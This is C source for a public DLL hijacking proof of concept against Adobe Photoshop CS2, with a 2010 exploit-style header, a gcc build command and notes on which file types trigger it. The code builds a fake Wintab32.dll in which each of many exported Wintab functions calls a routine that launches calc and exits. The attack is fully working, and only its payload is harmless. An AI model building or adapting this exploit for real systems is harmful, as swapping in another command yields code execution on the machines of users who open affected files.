/*

Exploit Title: Adobe Photoshop CS2 DLL Hijacking Exploit (Wintab32.dll)
Date: August 25, 2010
Author: storm (storm@gonullyourself.org)
Version: CS2 (9.0) - Other versions are very possibly exploitable too
Tested on: Windows Vista SP2

http://www.gonullyourself.org/

gcc -shared -o Wintab32.dll Photoshop-DLL.c

As far as I can tell, every file extension esoteric to Photoshop (documents, plug-ins, brushes, etc.) is affected, but image files (.png, .jpg, .bmp) are not affected.  Strangely enough, other file types such as .php and .c with Photoshop (only ones I tested) _are_ affected.

*/

#include <windows.h>
#define DllExport __declspec (dllexport)

DllExport void CloseTabletDevice() { hax(); }
DllExport void CreateTaskBarIcon() { hax(); }
DllExport void GetFunctionKeysEx() { hax(); }
DllExport int __stdcall RunTaskBarIconEx(void) { hax(); return 0xdefaced; }
DllExport void OpenTabletDevice() { hax(); }
DllExport void RegDeleteFKeys() { hax(); }
DllExport void RegGetFKeys() { hax(); }
DllExport void RemoveTaskBarIcon() { hax(); }
DllExport void RunClientSideService() { hax(); }
DllExport void RunTaskBarIcon() { hax(); }
DllExport void SetFunctionKeys() { hax(); }
DllExport void SetFunctionKeysEx() { hax(); }
DllExport void TDCalibration() { hax(); }
DllExport void TDGetHwInfoEx() { hax(); }
DllExport void TDGetHwInfoExV2() { hax(); }
DllExport void TDGetInfoEx() { hax(); }
DllExport void TDGetProtectData() { hax(); }
DllExport void TDSetInfoEx() { hax(); }
DllExport void TGL_Attach() { hax(); }
DllExport void TGL_Close() { hax(); }
DllExport void TGL_Detach() { hax(); }
DllExport void TGL_EndLine() { hax(); }
DllExport void TGL_Get() { hax(); }
DllExport void TGL_LineTo() { hax(); }
DllExport void TGL_MoveTo() { hax(); }
DllExport void TGL_Open() { hax(); }
DllExport void TGL_Set() { hax(); }
DllExport void UpdateTaskBar() { hax(); }
DllExport void WTClose() { hax(); }
DllExport void WTConfig() { hax(); }
DllExport void WTDataGet() { hax(); }
DllExport void WTDataPeek() { hax(); }
DllExport void WTEnable() { hax(); }
DllExport void WTExtGet() { hax(); }
DllExport void WTExtSet() { hax(); }
DllExport void WTGetA() { hax(); }
DllExport void WTGetActiveSessionID() { hax(); }
DllExport void WTGetW() { hax(); }
DllExport void WTInfoA() { hax(); }
DllExport void WTInfoW() { hax(); }
DllExport void WTMgrClose() { hax(); }
DllExport void WTMgrConfigReplaceExA() { hax(); }
DllExport void WTMgrContextEnum() { hax(); }
DllExport void WTMgrContextOwner() { hax(); }
DllExport void WTMgrCsrButtonMap() { hax(); }
DllExport void WTMgrCsrEnable() { hax(); }
DllExport void WTMgrCsrExt() { hax(); }
DllExport void WTMgrCsrPressureBtnMarks() { hax(); }
DllExport void WTMgrCsrPressureBtnMarksEx() { hax(); }
DllExport void WTMgrCsrPressureResponse() { hax(); }
DllExport void WTMgrDefContext() { hax(); }
DllExport void WTMgrDeviceConfig() { hax(); }
DllExport void WTMgrExt() { hax(); }
DllExport void WTMgrOpen() { hax(); }
DllExport void WTMgrPacketHookExA() { hax(); }
DllExport void WTMgrPacketHookNext() { hax(); }
DllExport void WTMgrPacketUnhook() { hax(); }
DllExport void WTOnEvent() { hax(); }
DllExport void WTOpenA() { hax(); }
DllExport void WTOpenW() { hax(); }
DllExport void WTOverlap() { hax(); }
DllExport void WTPacket() { hax(); }
DllExport void WTPacketsGet() { hax(); }
DllExport void WTPacketsPeek() { hax(); }
DllExport void WTQueuePacketsEx() { hax(); }
DllExport void WTQueueSizeGet() { hax(); }
DllExport void WTQueueSizeSet() { hax(); }
DllExport void WTRestore() { hax(); }
DllExport void WTSave() { hax(); }
DllExport void WTServiceStart() { hax(); }
DllExport void WTServiceStop() { hax(); }
DllExport void WTSetA() { hax(); }
DllExport void WTSetActiveSessionID() { hax(); }
DllExport void WTSetDevice() { hax(); }
DllExport void WTSetW() { hax(); }

int hax()
{
  WinExec("calc", 0);
  exit(0);
  return 0;
}